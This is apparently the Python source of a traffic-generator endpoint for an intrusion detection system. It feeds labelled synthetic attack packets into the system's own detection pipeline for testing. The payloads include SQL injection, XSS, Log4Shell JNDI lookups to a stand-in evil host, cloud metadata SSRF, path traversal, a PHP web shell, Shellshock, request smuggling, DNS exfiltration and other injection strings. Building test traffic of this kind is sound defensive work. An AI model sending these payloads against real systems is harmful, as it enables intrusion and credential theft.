"""
api/routes_generator.py — Synthetic Traffic Generator Endpoint

Generates authentic synthetic packet flows through the actual detection pipeline.
All packets pass through packet_queue -> detection_pipeline -> WebSocket -> detectors.
Reads thresholds directly from config.py to ensure genuine triggering.
Supports all 23 attack categories with realistic payloads and network headers.
"""

from fastapi import APIRouter, Depends, Request, HTTPException
from pydantic import BaseModel
from typing import Optional
import random
import time
import asyncio
import logging

from config import settings
from api.dependencies import get_current_user
from sniffer.packet_event import create_packet_event

logger = logging.getLogger("ids.generator")

router = APIRouter(tags=["generator"])


class TrafficRequest(BaseModel):
    mode: str
    attack_type: Optional[str] = None


def generate_random_ip():
    """Generate a realistic external IP that does not collide with the whitelist."""
    while True:
        # TEST-NET-1 (203.0.113.0/24) or TEST-NET-2 (198.51.100.0/24)
        prefix = random.choice(["203.0.113", "198.51.100"])
        ip = f"{prefix}.{random.randint(2, 254)}"
        if ip not in settings.WHITELIST_IPS and ip != settings.MANAGEMENT_IP:
            return ip


@router.post("/api/generate-traffic")
async def generate_traffic(request: Request, payload: TrafficRequest, user=Depends(get_current_user)):
    if not hasattr(request.app.state, "packet_queue"):
        raise HTTPException(status_code=500, detail="Packet queue not initialized")

    packet_queue = request.app.state.packet_queue
    packets_generated = 0

    port_scan_thresh = settings.PORT_SCAN_THRESHOLD
    brute_force_thresh = settings.BRUTE_FORCE_THRESHOLD
    brute_force_ports = settings.BRUTE_FORCE_PORTS
    syn_flood_min = settings.SYN_FLOOD_MIN_PACKETS

    mode = payload.mode
    attack_type = payload.attack_type or ""

    # ── 1. Normal Traffic Generation ─────────────────────────────
    if mode == "normal":
        for _ in range(5):
            ip = generate_random_ip()
            for _ in range(random.randint(2, 4)):
                dst_p = random.choice([80, 443])
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_ip="192.168.1.10",
                    dest_port=dst_p,
                    protocol="TCP",
                    tcp_flags="PA",
                    payload=f"GET /index.html HTTP/1.1\r\nHost: example.local\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
                    threat_level="NORMAL",
                    threat_detail="Legitimate HTTP browsing session",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.01)

    # ── 2. Burst Mode (Random Attack) ────────────────────────────
    elif mode == "burst":
        all_attacks = [
            "port_scan", "brute_force", "syn_flood", "sql_injection", "xss",
            "log4shell", "cloud_ssrf", "path_traversal", "php_rce", "shellshock",
            "http_request_smuggling", "api_abuse", "credential_stuffing", "jwt_attack",
            "dns_tunneling", "slowloris", "udp_flood", "icmp_flood",
            "command_injection", "ldap_injection", "xxe", "ssti", "insecure_deserialization"
        ]
        attack_type = random.choice(all_attacks)
        mode = "specific"

    # ── 3. Specific Attack Vector Simulations ────────────────────
    if mode == "specific":
        ip = generate_random_ip()

        # 3.1 Port Scan
        if attack_type in ["port_scan", "port-scan"]:
            for _ in range(port_scan_thresh + 6):
                target_port = random.randint(1024, 65000)
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=target_port,
                    protocol="TCP",
                    tcp_flags="S",
                    payload="",
                    threat_level="SUSPICIOUS",
                    threat_type="Port Scan",
                    threat_detail=f"SYN Probe to port {target_port}",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.005)

        # 3.2 Brute Force
        elif attack_type in ["brute_force", "brute-force"]:
            target_port = random.choice(brute_force_ports)
            for _ in range(brute_force_thresh + 5):
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=target_port,
                    protocol="TCP",
                    tcp_flags="S",
                    payload="",
                    threat_level="SUSPICIOUS",
                    threat_type="Brute Force",
                    threat_detail=f"Repeated auth connection to port {target_port}",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.005)

        # 3.3 SYN Flood
        elif attack_type in ["syn_flood", "syn-flood"]:
            # Normal background baseline
            for _ in range(syn_flood_min + 5):
                bg_ip = generate_random_ip()
                pkt = create_packet_event(source_ip=bg_ip, dest_port=80, protocol="TCP", tcp_flags="S")
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.001)
            # Volumetric spike from attacker
            for _ in range(syn_flood_min * 2 + 5):
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=443,
                    protocol="TCP",
                    tcp_flags="S",
                    threat_level="MALICIOUS",
                    threat_type="SYN Flood",
                    threat_detail="Volumetric SYN flood anomaly",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.001)

        # 3.4 SQL Injection
        elif attack_type in ["sql_injection", "sql-injection", "signature"]:
            payload_str = "GET /api/products?category=1' UNION ALL SELECT null, username, password FROM users-- HTTP/1.1\r\nHost: target.local\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="SQL Injection",
                threat_detail="UNION SELECT extraction exploit",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.5 Cross-Site Scripting (XSS)
        elif attack_type in ["xss", "cross-site-scripting"]:
            payload_str = "POST /api/comments HTTP/1.1\r\nHost: target.local\r\nContent-Type: application/json\r\n\r\n{\"comment\": \"<script>alert(document.cookie)</script>\"}"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="XSS",
                threat_detail="Stored XSS script payload",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.6 Log4Shell (CVE-2021-44228)
        elif attack_type in ["log4shell", "log4j"]:
            payload_str = "GET / HTTP/1.1\r\nHost: target.local\r\nUser-Agent: ${jndi:ldap://evil-exploit.com/rc}\r\nX-Forwarded-For: ${jndi:ldap://evil-exploit.com/rc}\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=443,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="Log4Shell",
                threat_detail="JNDI LDAP Lookup Injection",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.7 Cloud SSRF
        elif attack_type in ["cloud_ssrf", "cloud-ssrf", "ssrf"]:
            payload_str = "GET /fetch_avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: target.local\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="Cloud SSRF",
                threat_detail="AWS/GCP metadata credentials probe",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.8 Path Traversal
        elif attack_type in ["path_traversal", "path-traversal"]:
            payload_str = "GET /download?file=../../../../../../etc/passwd HTTP/1.1\r\nHost: target.local\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="Path Traversal",
                threat_detail="Directory traversal to /etc/passwd",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.9 PHP RCE
        elif attack_type in ["php_rce", "php-rce", "rce"]:
            payload_str = "POST /uploader.php HTTP/1.1\r\nHost: target.local\r\n\r\n<?php system($_GET['cmd']); ?>"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="PHP RCE",
                threat_detail="PHP backdoor code injection",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.10 Shellshock
        elif attack_type in ["shellshock", "cve-2014-6271"]:
            payload_str = "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: target.local\r\nUser-Agent: () { :; }; echo; /bin/uname -a\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="Shellshock",
                threat_detail="Bash environment function injection",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.11 HTTP Request Smuggling
        elif attack_type in ["http_request_smuggling", "http-request-smuggling"]:
            payload_str = "POST / HTTP/1.1\r\nHost: target.local\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.local\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="HTTP Request Smuggling",
                threat_detail="TE.CL desync smuggling attempt",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.12 API Abuse
        elif attack_type in ["api_abuse", "api-abuse"]:
            payload_str = "GET /api/v1/admin/users/export?format=csv HTTP/1.1\r\nHost: target.local\r\nAuthorization: Bearer test\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=8080,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="SUSPICIOUS",
                threat_type="API Abuse",
                threat_detail="Unauthorized BOLA administrative endpoint extraction",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.13 Credential Stuffing
        elif attack_type in ["credential_stuffing", "credential-stuffing"]:
            for pwd in ["admin", "123456", "password", "qwerty"]:
                payload_str = f"POST /api/login HTTP/1.1\r\nHost: target.local\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=root&password={pwd}"
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=80,
                    protocol="TCP",
                    tcp_flags="PA",
                    payload=payload_str,
                    threat_level="MALICIOUS",
                    threat_type="Credential Stuffing",
                    threat_detail=f"Automated dictionary spray with password '{pwd}'",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.01)

        # 3.14 JWT Attack
        elif attack_type in ["jwt_attack", "jwt-attack"]:
            payload_str = "GET /api/admin/dashboard HTTP/1.1\r\nHost: target.local\r\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.none\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=443,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="JWT Attack",
                threat_detail="JWT alg:none signature bypass attempt",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.15 DNS Tunneling
        elif attack_type in ["dns_tunneling", "dns-tunneling"]:
            payload_str = "61646d696e5f7365637265745f746f6b656e.tunnel.exfil.evil.com"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=53,
                protocol="UDP",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="DNS Tunneling",
                threat_detail="High-entropy hex encoded DNS exfiltration",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.16 Slowloris
        elif attack_type in ["slowloris", "slow-http"]:
            for i in range(10):
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=80,
                    protocol="TCP",
                    tcp_flags="PA",
                    payload=f"X-a: {i}\r\n",
                    threat_level="SUSPICIOUS",
                    threat_type="Slowloris",
                    threat_detail="Slow HTTP connection starvation header",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.01)

        # 3.17 UDP Flood
        elif attack_type in ["udp_flood", "udp-flood"]:
            for _ in range(18):
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=random.choice([53, 123, 5000]),
                    protocol="UDP",
                    payload="X" * 64,
                    threat_level="MALICIOUS",
                    threat_type="UDP Flood",
                    threat_detail="High-rate volumetric UDP datagram burst",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.005)

        # 3.18 ICMP Flood
        elif attack_type in ["icmp_flood", "icmp-flood"]:
            for _ in range(18):
                pkt = create_packet_event(
                    source_ip=ip,
                    dest_port=None,
                    protocol="ICMP",
                    payload="EchoRequest" + "A" * 32,
                    threat_level="MALICIOUS",
                    threat_type="ICMP Flood",
                    threat_detail="Volumetric ICMP Ping sweep/flood",
                )
                await packet_queue.put(pkt)
                packets_generated += 1
                await asyncio.sleep(0.005)

        # 3.19 Command Injection
        elif attack_type in ["command_injection", "command-injection"]:
            payload_str = "GET /diagnostics?ip=127.0.0.1; whoami HTTP/1.1\r\nHost: target.local\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="Command Injection",
                threat_detail="Shell command concatenation with /etc/passwd",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.20 LDAP Injection
        elif attack_type in ["ldap_injection", "ldap-injection"]:
            payload_str = "POST /ldap_auth HTTP/1.1\r\nHost: target.local\r\n\r\nusername=admin)(&(password=*))"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=389,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="LDAP Injection",
                threat_detail="LDAP filter wildcard bypass injection",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.21 XXE (XML External Entity)
        elif attack_type in ["xxe", "xml-external-entity"]:
            payload_str = "POST /api/xml_service HTTP/1.1\r\nHost: target.local\r\nContent-Type: application/xml\r\n\r\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/system.log\"> ]><data>&xxe;</data>"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="XXE",
                threat_detail="XML external entity file extraction",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.22 SSTI (Server-Side Template Injection)
        elif attack_type in ["ssti", "template-injection"]:
            payload_str = "GET /profile?name={{7*7}}{{self.__class__.__mro__[1].__subclasses__()}} HTTP/1.1\r\nHost: target.local\r\n\r\n"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=80,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="SSTI",
                threat_detail="Jinja2/Twig Python class traversal payload",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

        # 3.23 Insecure Deserialization
        elif attack_type in ["insecure_deserialization", "insecure-deserialization"]:
            payload_str = "POST /session/load HTTP/1.1\r\nHost: target.local\r\n\r\nrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBDFmDRAwACR"
            pkt = create_packet_event(
                source_ip=ip,
                dest_port=8080,
                protocol="TCP",
                tcp_flags="PA",
                payload=payload_str,
                threat_level="MALICIOUS",
                threat_type="Insecure Deserialization",
                threat_detail="Java serialized object magic bytes rO0AB",
            )
            await packet_queue.put(pkt)
            packets_generated += 1

    logger.info(
        "[TRAFFIC] Injected %d synthetic packets into queue (mode=%s, attack=%s)",
        packets_generated, mode, attack_type
    )

    return {
        "status": "ok",
        "packets_generated": packets_generated,
        "mode": mode,
        "attack_type": attack_type,
    }
